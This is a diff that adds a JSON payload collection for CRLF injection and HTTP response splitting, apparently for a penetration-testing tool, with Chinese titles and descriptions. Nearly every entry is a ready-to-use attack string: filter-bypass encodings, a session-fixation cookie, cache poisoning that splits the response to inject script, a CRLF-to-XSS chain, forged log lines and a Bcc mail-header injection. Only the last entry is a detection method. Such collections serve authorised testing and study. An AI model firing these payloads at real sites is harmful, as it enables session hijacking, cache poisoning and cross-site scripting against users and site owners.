@@ -1,0 +1,118 @@
+{
+  "kind": "payload",
+  "version": 1,
+  "group": "CRLF 注入 / HTTP 响应拆分",
+  "categories": ["基础注入", "Cookie 注入", "编码绕过", "组合利用", "检测思路"],
+  "items": [
+    {
+      "id": "crlf-basic",
+      "title": "基础 CRLF 注入",
+      "category": "基础注入",
+      "code": "%0d%0aSet-Cookie:crlf=injected",
+      "desc": "在参数中注入回车换行，尝试插入新的响应头。",
+      "tags": ["crlf", "header", "basic"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP CRLF Injection"
+    },
+    {
+      "id": "crlf-double-encode",
+      "title": "双重编码 CRLF",
+      "category": "编码绕过",
+      "code": "%250d%250aSet-Cookie:crlf=injected",
+      "desc": "目标解码一次后再使用时，双重编码可绕过过滤。",
+      "tags": ["crlf", "bypass", "encoding"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP CRLF Injection"
+    },
+    {
+      "id": "crlf-unicode",
+      "title": "Unicode 换行变体",
+      "category": "编码绕过",
+      "code": "%E5%98%8A%E5%98%8D",
+      "desc": "利用 UTF-8 编码的 U+560A / U+560D 等字符，部分解析器会归一化为 CRLF。",
+      "tags": ["crlf", "bypass", "unicode"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 CRLF 绕过研究"
+    },
+    {
+      "id": "crlf-cookie-fixation",
+      "title": "Cookie 固定",
+      "category": "Cookie 注入",
+      "code": "%0d%0aSet-Cookie:sessionid=attacker_session;Path=/",
+      "desc": "向响应中注入 Set-Cookie，实现会话固定攻击的前置条件。",
+      "tags": ["crlf", "cookie", "session"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP CRLF Injection"
+    },
+    {
+      "id": "crlf-header-inject",
+      "title": "注入任意响应头",
+      "category": "基础注入",
+      "code": "%0d%0aX-Injected:%20true",
+      "desc": "验证是否可以插入自定义响应头，是进一步利用的基础。",
+      "tags": ["crlf", "header"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP CRLF Injection"
+    },
+    {
+      "id": "crlf-cache-poison",
+      "title": "缓存投毒思路",
+      "category": "组合利用",
+      "code": "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>",
+      "desc": "构造响应拆分以污染 CDN 缓存，危害面较大，仅限授权环境验证。",
+      "tags": ["crlf", "cache", "poison", "xss"],
+      "vars": [],
+      "risk": "danger",
+      "source": "公开 Web 缓存投毒研究"
+    },
+    {
+      "id": "crlf-xss-chain",
+      "title": "CRLF 到 XSS",
+      "category": "组合利用",
+      "code": "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<svg/onload=alert(1)>",
+      "desc": "在可拆分响应的场景下注入 HTML，形成反射型 XSS。",
+      "tags": ["crlf", "xss"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP CRLF Injection"
+    },
+    {
+      "id": "crlf-log-inject",
+      "title": "日志注入",
+      "category": "组合利用",
+      "code": "%0d%0a[INFO]%20user%20logged%20in%20as%20admin",
+      "desc": "向日志写入伪造条目，干扰审计或配合日志包含利用。",
+      "tags": ["crlf", "log"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP Log Injection"
+    },
+    {
+      "id": "crlf-mail-inject",
+      "title": "邮件头注入",
+      "category": "组合利用",
+      "code": "%0d%0aBcc:attacker@example.com",
+      "desc": "向邮件头注入密送地址，需在授权范围内验证。",
+      "tags": ["crlf", "mail"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP CRLF Injection"
+    },
+    {
+      "id": "crlf-detect-diff",
+      "title": "响应差异检测",
+      "category": "检测思路",
+      "code": "分别提交 a%0d%0aX-Test:1 与 a 对比响应头与状态码",
+      "desc": "通过对比响应头差异判断注入是否生效。",
+      "tags": ["crlf", "detect"],
+      "vars": [],
+      "risk": "low",
+      "source": "OWASP CRLF Injection"
+    }
+  ]
+}
